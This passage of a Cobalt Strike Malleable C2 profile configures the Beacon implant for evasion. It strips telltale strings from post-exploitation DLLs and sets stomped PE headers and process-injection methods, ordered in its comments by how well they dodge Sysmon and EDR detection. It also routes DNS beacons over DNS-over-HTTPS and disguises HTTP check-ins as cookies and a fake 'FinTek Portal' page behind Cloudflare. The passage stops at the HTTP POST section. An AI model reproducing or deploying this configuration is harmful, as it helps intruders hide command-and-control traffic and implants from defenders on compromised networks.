        strrepex "ExecuteAssembly" "getting proc address for:" "";
        strrepex "ExecuteAssembly" "error re-setting memory protection" "";
        strrepex "ExecuteAssembly" "bad exception" "";
        
        strrepex "PowerPick" "Could not find signature in the" "";
        strrepex "PowerPick" "Could not fix signature in the" "";
        strrepex "PowerPick" "function:" "";
        strrepex "PowerPick" "Patch index" "";
        strrepex "PowerPick" "error setting memory protection" "";
        strrepex "PowerPick" "error re-setting memory protection" "";
        strrepex "PowerPick" "loading library" "";
        strrepex "PowerPick" "getting proc address:" "";
        strrepex "PowerPick" "Could not find .NET 4.0 API CLRCreateInstance" "";
        strrepex "PowerPick" "CLRCreateInstance failed w/hr 0x" "";
        strrepex "PowerPick" "ICLRMetaHost::GetRuntime (v4.0.30319) failed w/hr 0x" "";
        strrepex "PowerPick" ".NET runtime [ver" "";
        strrepex "PowerPick" "] cannot be loaded" "";
        strrepex "PowerPick" "ICLRRuntimeInfo::GetInterface failed w/hr 0x" "";
        strrepex "PowerPick" "Could not find API CorBindToRuntime" "";
        strrepex "PowerPick" "CorBindToRuntime failed w/hr 0x" "";
        strrepex "PowerPick" "Did not understand ver:" "";
        strrepex "PowerPick" "Failed to invoke IsAlive w/hr 0x" "";
        strrepex "PowerPick" "SafeArrayPutElement failed w/hr 0x" "";
        strrepex "PowerPick" "Failed to invoke InvokePS w/hr 0x" "";
        strrepex "PowerPick" "Failed to create the runtime host" "";
        strrepex "PowerPick" "CLR failed to start w/hr 0x" "";
        strrepex "PowerPick" "RuntimeClrHost::GetCurrentAppDomainId failed w/hr 0x" "";
        strrepex "PowerPick" "ICorRuntimeHost::GetDefaultDomain failed w/hr 0x" "";
        strrepex "PowerPick" "Failed to get default AppDomain w/hr 0x" "";
        strrepex "PowerPick" "Failed to load the assembly w/hr 0x" "";
        strrepex "PowerPick" "Failed to get the Type interface w/hr 0x" "";
        strrepex "PowerPick" "bad allocation" "";
        
        strrepex "SSHAgent" "Error allocating space for remote banner" "";
        strrepex "SSHAgent" "Received Banner:" "";
        strrepex "SSHAgent" "SSH-2.0-libssh2_1.8.0" "";
        strrepex "SSHAgent" " bytes at" "";
        strrepex "SSHAgent" "Unable to allocate memory for local banner" "";
        strrepex "SSHAgent" "Setting local Banner:" "";
        strrepex "SSHAgent" "API timeout expired" "";
        strrepex "SSHAgent" "Timed out waiting on socket" "";
        strrepex "SSHAgent" "Error waiting on socket" "";
        strrepex "SSHAgent" "Bad socket provided" "";
        strrepex "SSHAgent" "Failed changing socket's blocking state to non-blocking" "";
        strrepex "SSHAgent" "Failed sending banner" "";
        strrepex "SSHAgent" "Failed getting banner" "";
        strrepex "SSHAgent" "Unable to exchange encryption keys" "";
        strrepex "SSHAgent" "Unable to ask for ssh-userauth service" "";
        strrepex "SSHAgent" "Invalid response received from server" "";
        strrepex "SSHAgent" "Freeing session resource" "";
        strrepex "SSHAgent" "Disconnecting: reason=" "";
        strrepex "SSHAgent" "desc=" "";
        strrepex "SSHAgent" ", lang=" "";
        strrepex "SSHAgent" "too long description" "";
        strrepex "SSHAgent" "OFF" "";
        strrepex "SSHAgent" "Setting blocking mode" "";
        strrepex "SSHAgent" "Unable to allocate space for channel data" "";
        strrepex "SSHAgent" "Failed allocating memory for channel type name" "";
        strrepex "SSHAgent" "Unable to allocate temporary space for packet" "";
        strrepex "SSHAgent" "Would block sending channel-open request" "";
        strrepex "SSHAgent" "Unable to send channel-open request" "";
        strrepex "SSHAgent" "Would block" "";
        strrepex "SSHAgent" "Channel open failure (administratively prohibited)" "";
        strrepex "SSHAgent" "Channel open failure (connect failed)" "";
        strrepex "SSHAgent" "Channel open failure (unknown channel type)" "";
        strrepex "SSHAgent" "Channel open failure (resource shortage)" "";
        strrepex "SSHAgent" "Channel open failure" "";
        strrepex "SSHAgent" "Requesting direct-tcpip session to from" "";
        strrepex "SSHAgent" "Unable to allocate memory for direct-tcpip connection" "";
        strrepex "SSHAgent" "Would block sending global-request packet for forward listen request" "";
        strrepex "SSHAgent" "Requesting tcpip-forward session for" "";
        strrepex "SSHAgent" "Unable to allocate memory for setenv packet" "";
        strrepex "SSHAgent" "Unable to send global-request packet for forward listen request" "";
        strrepex "SSHAgent" "Unable to allocate memory for listener queue" "";
        strrepex "SSHAgent" "Unable to complete request for forward-listen" "";
        strrepex "SSHAgent" "Cancelling tcpip-forward session for" "";
        strrepex "SSHAgent" "Would block sending forward request" "";
        strrepex "SSHAgent" "Would block waiting for packet" "";
        strrepex "SSHAgent" "Channel not found" "";
        strrepex "SSHAgent" "Channel can not be reused" "";
        strrepex "SSHAgent" "starting request" "";
        strrepex "SSHAgent" "on channel" "";
        strrepex "SSHAgent" ", message=" "";
        strrepex "SSHAgent" "Unable to allocate memory for channel-process request" "";
        strrepex "SSHAgent" "Would block sending channel request" "";
        strrepex "SSHAgent" "Unable to send channel request" "";
        strrepex "SSHAgent" "Failed waiting for channel success" "";
        strrepex "SSHAgent" "Unable to complete request for channel-process-startup" "";
        strrepex "SSHAgent" "transport read" "";
        strrepex "SSHAgent" "channel_read() got" "";
        strrepex "SSHAgent" "of data from" "";
        strrepex "SSHAgent" "would block" "";
        strrepex "SSHAgent" "We've already closed this channel" "";
        strrepex "SSHAgent" "EOF has already been received, data might be ignored" "";
        strrepex "SSHAgent" "Failure while draining incoming flow" "";
        strrepex "SSHAgent" "Unable to send channel data" "";
        strrepex "SSHAgent" "Would block sending EOF" "";
        strrepex "SSHAgent" "Unable to send EOF on channel" "";
        strrepex "SSHAgent" "_libssh2_transport_read() bailed out!" "";
        strrepex "SSHAgent" "Unable to send EOF, but closing channel anyway" "";
        strrepex "SSHAgent" "Would block sending close-channel" "";
        strrepex "SSHAgent" "Unable to send close-channel request, but closing anyway" "";
        strrepex "SSHAgent" "libssh2_channel_wait_closed() invoked when channel is not in EOF state" "";
        strrepex "SSHAgent" "Unable to allocate a command buffer for SCP session" "";
        strrepex "SSHAgent" "scp -" "";
        strrepex "SSHAgent" "Would block starting up channel" "";
        strrepex "SSHAgent" "Would block requesting SCP startup" "";
        strrepex "SSHAgent" "Would block sending initial wakeup" "";
        strrepex "SSHAgent" "Would block waiting for SCP response" "";
        strrepex "SSHAgent" "Failed reading SCP response" "";
        strrepex "SSHAgent" "Failed to get memory" "";
        strrepex "SSHAgent" "got " "";
        strrepex "SSHAgent" "Failed to recv file" "";
        strrepex "SSHAgent" "Invalid data in SCP response" "";
        strrepex "SSHAgent" "Unterminated response from SCP server" "";
        strrepex "SSHAgent" "Invalid response from SCP server, too short" "";
        strrepex "SSHAgent" "Invalid response from SCP server, malformed mtime.usec" "";
        strrepex "SSHAgent" "Invalid response from SCP server, malformed mtime" "";
        strrepex "SSHAgent" "Invalid response from SCP server, too short or malformed" "";
        strrepex "SSHAgent" "Would block waiting to send SCP ACK" "";
        strrepex "SSHAgent" "Invalid response from SCP server, malformed mode" "";
        strrepex "SSHAgent" "Invalid response from SCP server, invalid mode" "";
        strrepex "SSHAgent" "Invalid response from SCP server, invalid size" "";
        strrepex "SSHAgent" "Invalid response from SCP server" "";
        strrepex "SSHAgent" "Would block sending SCP ACK" "";
        strrepex "SSHAgent" "Unexpected channel close" "";
        strrepex "SSHAgent" "Unknown error while getting error string" "";
        strrepex "SSHAgent" "Would block waiting for response from remote" "";
        strrepex "SSHAgent" "SCP failure" "";
        strrepex "SSHAgent" "Invalid ACK response from remote" "";
        strrepex "SSHAgent" "Sent " "";
        strrepex "SSHAgent" "Would block sending time data for SCP file" "";
        strrepex "SSHAgent" "Unable to send core file data for SCP file" "";
        strrepex "SSHAgent" "Would block waiting for response" "";
        strrepex "SSHAgent" "Invalid SCP ACK response" "";
        strrepex "SSHAgent" "Would block send core file data for SCP file" "";
        strrepex "SSHAgent" "failed to get memory" "";
        strrepex "SSHAgent" "failed to send file" "";
        strrepex "SSHAgent" "Unable to allocate memory for userauth_list" "";
        strrepex "SSHAgent" "Would block requesting userauth list" "";
        strrepex "SSHAgent" "Unable to send userauth-none request" "";
        strrepex "SSHAgent" "Failed getting response" "";
        strrepex "SSHAgent" "No error" "";
        strrepex "SSHAgent" "Permitted auth methods:" "";
        strrepex "SSHAgent" "Unable to allocate memory for userauth-password request" "";
        strrepex "SSHAgent" "Would block writing password request" "";
        strrepex "SSHAgent" "Unable to send userauth-password request" "";
        strrepex "SSHAgent" "Waiting for password response" "";
        strrepex "SSHAgent" "Authentication failed (username/password)" "";
        strrepex "SSHAgent" "Password expired, and callback failed" "";
        strrepex "SSHAgent" "Unable to allocate memory for userauth password change request" "";
        strrepex "SSHAgent" "Would block waiting" "";
        strrepex "SSHAgent" "Unable to send userauth password-change request" "";
        strrepex "SSHAgent" "Waiting for password response" "";
        strrepex "SSHAgent" "Authentication failed (username/password)" "";
        strrepex "SSHAgent" "Password expired, and callback failed" "";
        strrepex "SSHAgent" "Unable to allocate memory for userauth password change request" "";
        strrepex "SSHAgent" "Would block waiting" "";
        strrepex "SSHAgent" "Unable to send userauth password-change request" "";
        strrepex "SSHAgent" "Password Expired, and no callback specified" "";
        strrepex "SSHAgent" "Authentication failed" "";
        strrepex "SSHAgent" "Invalid data in public key file" "";
        strrepex "SSHAgent" "Unable to allocate memory for public key data" "";
        strrepex "SSHAgent" "Missing public key data" "";
        strrepex "SSHAgent" "Invalid public key data" "";
        strrepex "SSHAgent" "Invalid key data, not base64 encoded" "";
        strrepex "SSHAgent" "No handler for specified private key" "";
        strrepex "SSHAgent" "Unable to initialize private key from file" "";
        strrepex "SSHAgent" "Out of memory" "";
        strrepex "SSHAgent" "Invalid signature for supplied public key, or bad username/public key combination" "";
        strrepex "SSHAgent" "Invalid public key, too short" "";
        strrepex "SSHAgent" "Invalid public key" "";
        strrepex "SSHAgent" "Unable to send userauth-publickey request" "";
        strrepex "SSHAgent" "Waiting for USERAUTH response" "";
        strrepex "SSHAgent" "Username/PublicKey combination invalid" "";
        strrepex "SSHAgent" "Unable to allocate memory for userauth-publickey signed data" "";
        strrepex "SSHAgent" "Callback returned error" "";
        strrepex "SSHAgent" "Failed allocating additional space for userauth-publickey packet" "";
        strrepex "SSHAgent" "Waiting for publickey USERAUTH response" "";
        strrepex "SSHAgent" "Unable to extract public key from private key." "";
        strrepex "SSHAgent" "Invalid data in public and private key." "";
        strrepex "SSHAgent" "Unable to allocate memory for keyboard-interactive authentication" "";
        strrepex "SSHAgent" "Unable to send keyboard-interactive request" "";
        strrepex "SSHAgent" "Waiting for keyboard USERAUTH response" "";
        strrepex "SSHAgent" "Authentication failed (keyboard-interactive)" "";
        strrepex "SSHAgent" "Unable to allocate memory for keyboard-interactive 'name' request field" "";
        strrepex "SSHAgent" "Unable to allocate memory for keyboard-interactive 'instruction' request field" "";
        strrepex "SSHAgent" "Unable to allocate memory for keyboard-interactive prompts array" "";
        strrepex "SSHAgent" "Unable to allocate memory for keyboard-interactive responses array" "";
        strrepex "SSHAgent" "Unable to allocate memory for keyboard-interactive prompt message" "";
        strrepex "SSHAgent" "Unable to allocate memory for keyboard-interactive response packet" "";
        strrepex "SSHAgent" "Unable to send userauth-keyboard-interactive request" "";
        strrepex "SSHAgent" "keepalive@libssh2.org" "";
        strrepex "SSHAgent" "Unable to send keepalive message" "";
        strrepex "SSHAgent" "Unable to allocate memory for base64 decoding" "";
        strrepex "SSHAgent" "former error forgotten (OOM)" "";
        strrepex "SSHAgent" "Invalid base64" "";
        strrepex "SSHAgent" "Out of memory error" "";
        strrepex "SSHAgent" "Unable to send KEX init message" "";
        strrepex "SSHAgent" "Timed out waiting for KEX reply" "";
        strrepex "SSHAgent" "Unable to allocate memory for a copy of the host key" "";
        strrepex "SSHAgent" "Unable to initialize hostkey importer" "";
        strrepex "SSHAgent" "Unable to allocate buffer for K" "";
        strrepex "SSHAgent" "Unable to verify hostkey signature" "";
        strrepex "SSHAgent" "Unable to send NEWKEYS message" "";
        strrepex "SSHAgent" "Timed out waiting for NEWKEYS" "";
        strrepex "SSHAgent" "Unable to allocate buffer for SHA digest" "";
        strrepex "SSHAgent" "Unable to send Group Exchange Request" "";
        strrepex "SSHAgent" "Timeout waiting for GEX_GROUP reply" "";
        strrepex "SSHAgent" "Unable to send Group Exchange Request SHA256" "";
        strrepex "SSHAgent" "Timeout waiting for GEX_GROUP reply SHA256" "";
        strrepex "SSHAgent" "Unable to allocate memory" "";
        strrepex "SSHAgent" "Unable to send KEXINIT packet to remote host" "";
        strrepex "SSHAgent" "Agreed on KEX method:" "";
        strrepex "SSHAgent" "Agreed on HOSTKEY method:" "";
        strrepex "SSHAgent" "Agreed on CRYPT_CS method:" "";
        strrepex "SSHAgent" "Agreed on MAC_CS method:" "";
        strrepex "SSHAgent" "Agreed on MAC_SC method:" "";
        strrepex "SSHAgent" "Agreed on COMP_CS method:" "";
        strrepex "SSHAgent" "Agreed on COMP_SC method:" "";
        strrepex "SSHAgent" "Unrecoverable error exchanging keys" "";
        strrepex "SSHAgent" "Remote received connection from" "";
        strrepex "SSHAgent" "Unable to allocate a channel for new connection" "";
        strrepex "SSHAgent" "Forward not requested" "";
        strrepex "SSHAgent" "Unable to send open failure" "";
        strrepex "SSHAgent" "X11 Connection Received from" "";
        strrepex "SSHAgent" "on channel" "";
        strrepex "SSHAgent" "allocate a channel for new connection" "";
        strrepex "SSHAgent" "X11 Forward Unavailable" "";
        strrepex "SSHAgent" "Invalid MAC received" "";
        strrepex "SSHAgent" "Disconnect(" "";
        strrepex "SSHAgent" "memory for signal name" "";
        strrepex "SSHAgent" "Debug Packet:" "";
        strrepex "SSHAgent" "Received global request type" "";
        strrepex "SSHAgent" "(wr " "";
        strrepex "SSHAgent" "Packet received for unknown channel" "";
        strrepex "SSHAgent" "Packet contains more data than we offered to receive, truncating" "";
        strrepex "SSHAgent" "The current receive window is full, data ignored" "";
        strrepex "SSHAgent" "Remote sent more data than current window allows, truncating" "";
        strrepex "SSHAgent" "received request type" "";
        strrepex "SSHAgent" "Channel " "";
        strrepex "SSHAgent" "Exit signal" "";
        strrepex "SSHAgent" "received for channel" "";
        strrepex "SSHAgent" "Recved" "";
        strrepex "SSHAgent" "bytes to" "";
        strrepex "SSHAgent" "bytes at" "";
        strrepex "SSHAgent" "Key type not supported" "";
        strrepex "SSHAgent" "rijndael-cbc@lysator.liu.se" "";
        strrepex "SSHAgent" "hmac-ripemd160@openssh.com" ""; 

        # replace a string in all post exploitation dlls 
        #strrep "!This program cannot be run in DOS mode." ""; 
    } 

    transform-x86 { 
        # replace a string in the port scanner dll 
        strrepex "PortScanner" "Scanner module is complete" "Scan is complete"; 

        # replace a string in all post exploitation dlls 
        strrep "is alive." "is up."; 
    }
}

################################################
## Memory Indicators
################################################
## Description:
##    The stage block in Malleable C2 profiles controls how Beacon is loaded into memory and edit the content of the Beacon Reflective DLL.
## Values:
##    allocator         VirtualAlloc            CS 4.2 - Set how Beacon's Reflective Loader allocates memory for the agent. Options are: HeapAlloc, MapViewOfFile, and VirtualAlloc
##    checksum          0                       The CheckSum value in Beacon's PE header
##    cleanup           false                   Ask Beacon to attempt to free memory associated with the Reflective DLL package that initialized it.
##    compile_time      14 July 2009 8:14:00    The build time in Beacon's PE header
##    entry_point       92145                   The EntryPoint value in Beacon's PE header
##    image_size_x64    512000                  SizeOfImage value in x64 Beacon's PE header
##    image_size_x86    512000                  SizeOfImage value in x86 Beacon's PE header
##    magic_mz_x86      MZRE                    CS 4.2 - Override the first bytes (MZ header included) of Beacon's Reflective DLL. Valid x86 instructions are required. Follow instructions that change CPU state with instructions that undo the change.
##    magic_mz_x64      MZAR                    CS 4.2 - Same as magic_mz_x86; affects x64 DLL.
##    module_x64        xpsservices.dll         Same as module_x86; affects x64 loader
##    module_x86        xpsservices.dll         Ask the x86 ReflectiveLoader to load the specified library and overwrite its space instead of allocating memory with VirtualAlloc.
##    magic_pe          PE                      Override the PE character marker used by Beacon's Reflective Loader with another value.
##    name	            beacon.x64.dll          The Exported name of the Beacon DLL
##    obfuscate         false                   Obfuscate the Reflective DLL's import table, overwrite unused header content, and ask ReflectiveLoader to copy Beacon to new memory without its DLL headers. As of 4.2 CS now obfuscates .text section in rDLL package
##    rich_header       N/A                     Meta-information inserted by the compiler
##    sleep_mask        false                   CS 3.12 - Obfuscate Beacon (HTTP, SMB, TCP Beacons), in-memory, prior to sleeping (HTTP) or waiting for a new connection\data (SMB\TCP)
##    smartinject       false                   CS 4.1 added to stage block - Use embedded function pointer hints to bootstrap Beacon agent without walking kernel32 EAT
##    stomppe           true                    Ask ReflectiveLoader to stomp MZ, PE, and e_lfanew values after it loads Beacon payload
##    userwx            false                   Ask ReflectiveLoader to use or avoid RWX permissions for Beacon DLL in memory
## Guidelines:
##    - Modify the indicators to minimize in memory indicators
#     - Refer to 
##       https://blog.cobaltstrike.com/2018/02/08/in-memory-evasion/
##       https://www.youtube.com/playlist?list=PL9HO6M_MU2nc5Q31qd2CwpZ8J4KFMhgnK
##       https://www.youtube.com/watch?v=AV4XjxYe4GM (Obfuscate and Sleep)


################################################
## Process Injection
################################################
## Description:
##    The process-inject block in Malleable C2 profiles shapes injected content and controls process injection behavior.
## Values:
##    allocator         VirtualAllocEx      The preferred method to allocate memory in the remote process. Specify VirtualAllocEx or NtMapViewOfSection. The NtMapViewOfSection option is for same-architecture injection only. VirtualAllocEx is always used for cross-arch memory allocations.
##    min_alloc         4096                Minimum amount of memory to request for injected content.
##    startrwx          false               Use RWX as initial permissions for injected content. Alternative is RW.
##    userwx            false               Use RWX as final permissions for injected content. Alternative is RX.
## 
## 
## Use the transform-x86\x64 to pad content injected by Beacon
## Use the execute block to control use of Beacon's process injection techniques
## Guidelines:
##    - Modify the indicators to minimize in memory indicators
#     - Refer to 
##       https://www.cobaltstrike.com/help-malleable-c2#processinject
##       https://blog.cobaltstrike.com/2019/08/21/cobalt-strikes-process-injection-the-details/

process-inject {
  set allocator "NtMapViewOfSection";
  set startrwx "false";
  set userwx "false";
  set bof_allocator "HeapAlloc";  #Specify VirtualAlloc, MapViewOfFile, or HeapAlloc. 
  set bof_reuse_memory "true";
  set min_alloc "17384";

  #Use the prepend.py script from WKL github to generate a dynamic prepend value (support x64 only)
  #https://github.com/WKL-Sec/Malleable-CS-Profiles/blob/main/prepend.py
  transform-x86 {
    prepend "\x90\x90";
    #append
}

  transform-x64 {
    prepend "\x69\x66\xd2\x49\x48\x40\x90\x66\x87\xc9\x46\x66\x0f\x1f\x04\x00\x0f\x1f\x00\x45\x0f\x1f\x04\x00\x41\x87\xdb\x66\x87\xdb\x40\x42\x49\x87\xd2\x43\x4c\x87\xc9\x0f\x1f\x00\x47\x66\x90\x0f\x1f\x00";
    append "\x4E\x4F\x4B\x43\x4C\x48\x90\x66\x90\x0F\x1F\x00\x66\x0F\x1F\x04\x00\x0F\x1F\x04\x00\x0F\x1F\x00\x0F\x1F\x00";
  }

  # Execute block — CS tries each method in order until one succeeds.
  # ORDER MATTERS: stealthiest primary first; remove fallbacks that produce
  # Sysmon Event 8 / Get-InjectedThread-detectable RWX stubs.
  execute {
    # 1. Earliest-Bird APC against the spawned suspended primary thread.
    #    Stealthiest for fork-and-run (senjata-runner default). Spoofs start
    #    address to RtlUserThreadStart so the thread looks like a normal new
    #    thread, not an APC-hijacked one.
    NtQueueApcThread-s "ntdll.dll!RtlUserThreadStart";

    # 2. ObfSetThreadContext: obfuscated SetThreadContext (CS 4.10+). Routes
    #    through TpReleaseCleanupGroupMembers gadget so RIP looks legitimate
    #    if EDR snapshots context. Works on spawn-suspended threads.
    ObfSetThreadContext "ntdll!TpReleaseCleanupGroupMembers+0x450";

    # 3. Plain SetThreadContext fallback — last resort for spawn-suspended.
    SetThreadContext;

    # DELIBERATELY OMITTED — all of the below trigger Sysmon Event 8 and have
    # mature EDR detections via Get-InjectedThread / Falcon CreateRemoteThread
    # rules. If primary spawn-suspended methods above fail, we want CS to
    # error out loudly (so operator can investigate) rather than silently
    # downgrade to a method the engagement OPSEC plan doesn't permit:
    #
    #   CreateThread             — RWX stub, fires Sysmon Event 8
    #   CreateRemoteThread       — cross-process, fires Sysmon Event 8, classic IOC
    #   RtlCreateUserThread      — same noise level as CreateRemoteThread + RWX
    #   NtQueueApcThread         — non-suspended target; APC against existing
    #                              thread of running process (RWX stub variant)
  }
}
################################################
## Maleable C2 
## https://www.cobaltstrike.com/help-malleable-c2#options
################################################
## HTTP Headers
################################################
## Description:
##    The http-config block has influence over all HTTP responses served by Cobalt Strike’s web server. Here, you may specify additional HTTP headers and the HTTP header order.
## Values:
##    set headers                   "Comma separated list of headers"    The set headers option specifies the order these HTTP headers are delivered in an HTTP response. Any headers not in this list are added to the end.
##    header                        "headername" "header alue            The header keyword adds a header value to each of Cobalt Strike's HTTP responses. If the header value is already defined in a response, this value is ignored.
##    set trust_x_forwarded_for     "true"                               Adds this header to determine remote address of a request.
## Guidelines:
##    - Use this section in addition to the "server" secion in http-get and http-post to further define the HTTP headers 
dns-beacon {
    set maxdns "255";
    set dns_idle "0.0.0.0";
    set dns_max_txt "252";
    set dns_sleep "0";
    set dns_stager_prepend "";
    set dns_stager_subhost "product.";
    set dns_ttl "1";

    set beacon         "staging.";
    set get_A          "prod.";
    set get_AAAA       "uat-b.";
    set get_TXT        "prd.";
    set put_metadata   "qa.";
    set put_output     "uat-a.";

    # Use "ns_response" when a DNS server is responding to a target with "Server failure" errors.
    set ns_response "zero";

    # Use these options to egress DNS Beacons with "DNS Over HTTPS"
    set comm_mode "dns-over-https";
    dns-over-https {
        set doh_verb           "POST";
        set doh_useragent      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0";
        set doh_proxy_server   "";
        set doh_server         "dns.google,cloudflare-dns.com";
        set doh_accept         "application/dns-message";
        header "Content-Type"  "application/dns-message";
    }

}

http-beacon {
    # Use wininet or winhttp library? (default: wininet)
    set library "winhttp";

    # send random data in all beacon check-in/callbacks (and how much?)
    set data_required "true";
    set data_required_length "128-256";   # Random from 256 to 512
}

http-config {
    set headers "Date, Server, Content-Length, Content-Type";
    # header "Server" "Apache";
    # header "Keep-Alive" "timeout=10, max=100";
    header "Connection" "close";
    # Use this option if your teamserver is behind a redirector
    set trust_x_forwarded_for "true";
    set block_useragents "curl*,lynx*,wget*";
}

################################################
## HTTP GET
################################################
## Description:
##    GET is used to poll teamserver for tasks
## Defaults:
##    uri "/activity"
##    Headers (Sample)
##      Accept: */*
##      Cookie: CN7uVizbjdUdzNShKoHQc1HdhBsB0XMCbWJGIRF27eYLDqc9Tnb220an8ZgFcFMXLARTWEGgsvWsAYe+bsf67HyISXgvTUpVJRSZeRYkhOTgr31/5xHiittfuu1QwcKdXopIE+yP8QmpyRq3DgsRB45PFEGcidrQn3/aK0MnXoM=
##      User-Agent Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1)
## Guidelines:
##    - Add customize HTTP headers to the HTTP traffic of your campaign
##    - Analyze sample HTTP traffic to use as a reference
##    - Multiple URIs can be added. Beacon will randomly pick from these.
##      - Use spaces as a URI seperator
http-get {

    set uri "/administration /profile /accounting /transactions/history /carts /portofolio /checkout";
    set verb "GET";

    client {
	    header "Accept" "text/html,application/xhtml+xml;q=0.9;q=0.8";
        header "Accept-Encoding" "gzip, deflate";
        header "Accept-Language" "en-US,en;q=0.5";
        header "Sec-Fetch-Dest" "document";
        header "Sec-Fetch-Mode" "navigate";
        header "Sec-Fetch-Site" "cross-site";
        header "Priority" "u=0, i";
        header "Te" "trailers";
        metadata {
            mask;
            mask;
            base64url;
            prepend "unm_device_id=ae3c6913-20db-444f-979e-12059378cde0; cf_clearance=";
            append "; _ga_D4RSCKVS19=GS1.1.1738981327.1.1.1738981431.0.0.0; _ga=GA1.1.1268647298.1737183478;";
            header "Cookie";
        }
    }

    server {
        header "Content-Type" "text/html; charset=utf-8";
        header "Set-Cookie" "userlang=id; Path=/; SameSite=Lax";
        header "X-Powered-By" "Next.js";
        header "Cf-Cache-Status" "DYNAMIC";
        header "Set-Cookie" "__cf_bm=9qkGNUlAAvoLqdSanxKvCRkHVJEBZbUV3lUUHgQVmFQ-1739974868-1.0.1.1-Z4WZUwkulZthtYJXVVAa.HmB.HWys5pDXK3u6xgdZay1eDwvP3t91HTCUTw_pDUMpszsOn2.loREdIDix.m7JA; path=/; HttpOnly; Secure; SameSite=None";
        header "Server" "cloudflare";
        header "Cf-Ray" "9146e6da1a130ec4-HKG";
        header "Cache-Control" "max-age=0, no-cache";
        header "Pragma" "no-cache";
        header "Connection" "close";
        output {   
            mask;
            mask;
            base64;
            prepend "<!DOCTYPE html><html translate=\"no\" lang=\"id\"><head><title>FinTek Portal</title><meta charSet=\"utf-8\"/><meta name=\"viewport\" content=\"width=device-width\"/><meta name=\"next-head-count\" content=\"2\"/><link rel=\"shortcut icon\" type=\"image/png\" href=\"/t/01E22E1SE/original/test-discovery/2023/08/09/f076ba41-0d02-429b-ab6b-ffb8f8bf1b2a-1691548794692-f971249bfad90c191e51ee1e4da087f8.png\"/><noscript><div style=\"display:flex;flex-direction:column;align-items:center;justify-content:center;height:calc(100vh - 40px);padding:0 20px;font-family:TiketOdysseyText,system-ui,-apple-system,Segoe UI,Roboto,Helvetica,Arial,sans-serif,Apple Color Emoji,Segoe UI Emoji\"><span style=\"font-size:16px;font-weight:bold;text-align:center;display:block;margin-bottom:8px;line-height:20.08px\">Please Enable Javascript</span><span style=\"text-align:center;font-size:14px;line-height:20.02px\">You Cannot See This Page Without Javascript.</span></div></noscript><link rel=\"preload\" href=\"/assets/unm/v1.1.28/_next/static/css/c7814113cdc2d3db.css\" as=\"style\"/><link rel=\"stylesheet\" href=\"/assets/unm/v1.1.28/_next/static/css/c7814113cdc2d3db.css\" data-n-p=\"\"/><link rel=\"preload\" href=\"/assets/unm/v1.1.28/_next/static/css/d3c5faaf036708b7.css\" as=\"style\"/><link rel=\"stylesheet\" href=\"/assets/unm/v1.1.28/_next/static/css/d3c5faaf036708b7.css\" data-n-p=\"\"/><noscript data-n-css=\"\"></noscript><script defer=\"\" nomodule=\"\" src=\"/assets/unm/v1.1.28/_next/static/chunks/polyfills-5cd94c89d3acac5f.js\"></script><script src=\"/assets/unm/v1.1.28/_next/static/chunks/webpack-66c2cb8e0eb41c43.js\" defer=\"\"></script><script src=\"/assets/unm/v1.1.28/_next/static/chunks/framework-3de4153a9f67e799.js\" defer=\"\"></script><script src=\"/assets/unm/v1.1.28/_next/static/chunks/main-68f97f28e8e907f0.js\" defer=\"\"></script><script src=\"/assets/unm/v1.1.28/_next/static/chunks/pages/_app-e83ed02bf5f0a7d1.js\" defer=\"\"></script><script src=\"/assets/unm/v1.1.28/_next/static/chunks/4733-d15c7b39febc2c10.js\" defer=\"\"></script><script src=\"/assets/unm/v1.1.28/_next/static/chunks/6137-73924d1bcf75c522.js\" defer=\"\"></script><script src=\"/assets/unm/v1.1.28/_next/static/chunks/6287-b6d1c5ce925555e9.js\" defer=\"\"></script><script src=\"/assets/unm/v1.1.28/_next/static/chunks/2782-0b5280f103455103.js\" defer=\"\"></script><script src=\"/assets/unm/v1.1.28/_next/static/chunks/5629-480187b5c59eb73c.js\" defer=\"\"></script><script src=\"/assets/unm/v1.1.28/_next/static/chunks/7351-d5a95d11f134e5e7.js\" defer=\"\"></script><script src=\"/assets/unm/v1.1.28/_next/static/chunks/42-ff3cd9f73ee23904.js\" defer=\"\"></script><script src=\"/assets/unm/v1.1.28/_next/static/chunks/1699-a49200b84f60bc82.js\" defer=\"\"></script><script src=\"/assets/unm/v1.1.28/_next/static/chunks/8510-ff264851ff03be9c.js\" defer=\"\"></script><script src=\"/assets/unm/v1.1.28/_next/static/chunks/8032-7d02228ef872ea35.js\" defer=\"\"></script><script src=\"/assets/unm/v1.1.28/_next/static/chunks/1001-1013b532ef99c09e.js\" defer=\"\"></script><script src=\"/assets/unm/v1.1.28/_next/static/chunks/pages/account-8660a7ddf9afb051.js\" defer=\"\"></script><script src=\"/assets/unm/v1.1.28/_next/static/unm__c195f0d1377cbad09d1358823e48dab72d9e48bd/_buildManifest.js\" defer=\"\"></script><script src=\"/assets/unm/v1.1.28/_next/static/unm__c195f0d1377cbad09d1358823e48dab72d9e48bd/_ssgManifest.js\" defer=\"\"></script><script src=\"/assets/unm/v1.1.28/_next/static/unm__c195f0d1377cbad09d1358823e48dab72d9e48bd/_middlewareManifest.js\" defer=\"\"></script></head><body><div id=\"__next\" data-reactroot=\"\"></div><script id=\"__NEXT_DATA__\" type=\"application/json\">{\"props\":{\"pageProps\":{}},\"page\":\"/account\",\"query\":{},\"buildId\":\"unm__c195f0d1377cbad09d1358823e48dab72d9e48bd\",\"assetPrefix\":\"/assets/unm/v1.1.28\",\"nextExport\":true,\"autoExport\":true,\"isFallback\":false,\"locale\":\"id\",\"locales\":[\"id\",\"en\"],\"defaultLocale\":\"id\",\"scriptLoader\":[]}</script><script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML=\"window.__CF$cv$params={r:'9146e6ce5d6b0ec4',t:'";
            append "'};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);\";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script></body></html>";
            print;
        }
    }
}

################################################
## HTTP POST
################################################
## Description:
